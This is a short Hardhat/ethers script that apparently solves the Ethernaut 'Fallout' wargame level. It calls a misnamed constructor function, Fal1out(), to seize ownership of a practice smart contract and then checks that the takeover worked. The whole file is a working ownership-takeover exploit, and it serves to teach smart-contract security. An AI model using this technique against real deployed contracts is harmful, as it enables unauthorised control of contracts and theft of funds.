import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x465Df401621060aE6330C13cA7A0baa2B0a9d66D"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Fallout", CONTRACT_ADDRESS, signer)

    await contract.Fal1out()

    const owner = await contract.owner()
    console.log("Calling Fal1out fn...");
    
    if (owner === PLAYER_ADDRESS) {
        console.log("Contract successfully penetrated");
    }

}


// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });